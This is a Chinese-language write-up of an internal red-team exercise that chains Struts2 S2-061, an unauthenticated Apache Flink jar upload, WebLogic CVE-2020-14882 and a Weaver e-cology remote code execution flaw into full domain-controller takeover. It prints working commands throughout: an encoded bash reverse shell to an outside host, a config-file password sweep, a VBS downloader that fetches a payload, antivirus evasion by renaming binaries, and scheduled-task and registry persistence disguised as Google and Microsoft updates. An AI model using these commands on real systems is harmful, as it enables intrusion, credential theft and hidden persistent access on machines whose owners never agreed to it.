## 首先放上思维导图

![image-20211123114509893](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-20211123114509893.png)

| 主机  | IP                | 权限             |
| ----- | ----------------- | ---------------- |
| mail  | 192.168.1.13      | root             |
| fink  | 192.168.1.17      | 普通用户         |
| pc    | 10.1.1.9          | system           |
| oa    | 10.1.1.3/10.1.5.7 | system           |
| dc-01 | 10.1.5.6          | DC administrator |



### 外围打点：S2-061

对目标web站点进行扫描
发现该站点存在struts2-061漏洞

先寻找利用点

![image-20211123115908015](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-20211123115908015.png)

发现WAF未重制链接，也没有执行构造的表达式，于是翻阅分析github的EXP，发现部分EXP使用了表单提交，于是改用post表单传参提交，成功执行表达式。

![image-20211123120023587](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-20211123120023587.png)

反弹shell:

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC80NDU1IDA+JjE=}|{base64,-d}|{bash,-i}nc -vlp 9004
```

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-72a78828c8644d9597cab65b826f5df2.png)

进行信息收集,配置文件搜索关键字password,并发现密码：

```
find /  \( -name '*.conf' -o -name '*.xml' \) -exec grep  -ir 'password=' {} \; 2>/dev/null
```

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-c78dd38885244bcda96c390f90585fdd.png)

利用收集的密码尝试使用tomcat用户通过socks代理登录ssh，成功登录
可通过sudo直接提权，拿到root权限：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-ab123b2d342b4d4dba8ddb286867ba3f.png)

配置nps代理，作为跳板。

### 二层：Apache FLink未授权

使用一层跳板，对192.1.1.1/24进行全端口扫描，进行筛选后提取的有效的信息：
http://192.168.1.17/#/overview apache fink
[http://192.168.1.3:8001](http://192.168.1.3:8001/) weblogic

Apache FLink未授权上传jar包远程代码执行漏洞
msf生成恶意jar文件，执行反弹shell，上线后发现为docker环境，在尝试逃逸无效后遂放弃。

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-dada68c968034a828ff2fbc0c77459ff.png)

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-9dfad3485d3f432c93fbdcf8b3640590.png)

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-7d8385bf5cc049d482ec2129c60d73e1.png)



### 二层：weblogic未授权命令执行(CVE-2020-14882)

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-f63219a1296f49c49d4d3900fbae65da.png)

经探测存在CVE-2020-14882 14883漏洞，利用成功：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-560c03c3907048d29e45ee1dc8347ce9.png)

写入vbs下载器，下载恶意exe，并执行上线CS：
echo写入vbs脚本，运行脚本成功下载到1.xml：

```powershell
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^","http://xxxxx:9042/svchost.txt",0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile "1.xml",2 > C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\d.vbs
```


![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-30b0dc02ae6d4f198c333ff65bf6ce92.png)

更名为.exe成功绕过火绒上线：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-765403dced2f4a35a0e697dffd25615c.png)

计划任务以及注册表启动项做权限维持：

```powershell
schtasks /create /SC HOURLY /RU "NT Authority\SYSTEM" /TN "GoogleUpdate" /TR "C:\windows\system32\scvhost.exe"
shell reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftUpdate  /t REG_SZ  /d "C:\windows\system32\scvhost.exe"
```

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-9b9d8e2f560945bca7b4e3f1b2de420d.png)

获取密码

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-2fb7f26a40ab420a8fa0f1f785d561c6.png)

网段查看 arp-a

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-3f62b24073d942969bcf02ba95c6e1f6.png)

查看工作组 net view

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-7b921444ee97480cb62686cac40693f0.png)

继续使用nps做代理，为二层跳板。

### 三层：泛微OA E-cology 远程代码执行漏洞

使用二层weblogic跳板机作为代理，进行扫描发现泛微OA：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-4db761c21a9d497db80adc173f92064b.png)

/weaver/bsh.servlet.BshServlet 该页面可执行命令

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-1891b2b1a48a4e6d8b6cbec06ef738bb.png)

发现域

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-2d523533462c4409abb469e11f48844b.png)

使用泛微OA E-cology 远程代码执行漏洞 获取权限system 且为某域内主机。

上线cs，发现只有80端口能出网，随cs设置80端口监听

将powershell可执行程序复制到其他目录并重命名，绕过火绒上线CS：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-16d8b861558043de9176e0e5d833698f.png)

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-59d1b1c879414415ba59a1a58d399819.png)

计划任务/注册表启动项权限维持。

```powershell
shell schtasks /create /SC DAILY /RU "NT Authority\SYSTEM" /TN "GoogleUpdateCheck" /TR "cmd /c start /b C:\windows\system32\scvhost.exe" /F
shell reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUpdateCheck /t REG_SZ /d "C:\windows\system32\GoogleUpdate.bat"
```

域内信息收集：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-4365c7422164440ea973cf577c248c61.png)

发现有域管理员运行的进程，凭证窃取：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-bcdfb84a88494c59b3a1d3150827c2e2.png)

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-3901c19440e74bdbba9f542604e3cda5.png)

伪装成域管理员，获取全域hash:

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-8289cc2a3f8e46dbb7f1d630d0475065.png)

窃取令牌后，可获得域管理员权限，并可成功访问域控：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-9ce987d64c604d75a5760696a98eaa8c.png)

将免杀cs beacon复制到域控：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-19707fcdceae4bb591bfe95db5027003.png)

创建计划任务远程执行：

```powershell
shell schtasks /create /S dc-01 /SC DAILY  /RU "NT Authority\SYSTEM" /TN "MicrosoftUpdate"  /TR "c:\windows\system32\WinDefender.exe"  /F
shell schtasks /Run /S dc-01 /TN "MicrosoftUpdate"
```

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-4650d0c2497443f9bc4754e6a8fc6a4b.png)

拿到域控权限：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-00aa4c6a74d949f49fba0627de0676bd.png)

维持访问：

```powershell
shell schtasks /create /SC HOURLY /RU "NT Authority\SYSTEM" /TN "GoogleUpdateCheck" /TR "cmd /c start /b C:\windows\system32\WinDefender.exe " /F
shell reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftUpdate /t REG_SZ /d "C:\windows\system32\WinDefender.exe"
```

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-cca54d014f6a4869a42aa788bc552584.png)

时至今日：

![image.png](../assets/2021-03-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E7%BB%84%E7%BB%87%E7%9A%84%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/image-469f4e3f003249fb99ce2b8d40345bf6.png)

至此，靶标沦陷。



## 总结

本次目标URL共有2个，但其中一个为长期荒废的测试主机，问题就出在了这里。

在我方进行攻击时，防守方在后期发现了我方的C2服务器，对我方其中一台C2实行了DDOS攻击，为了解决此问题，使用了HoneyPort、PortSpoof与Iptables组合反制了DDOS攻击。

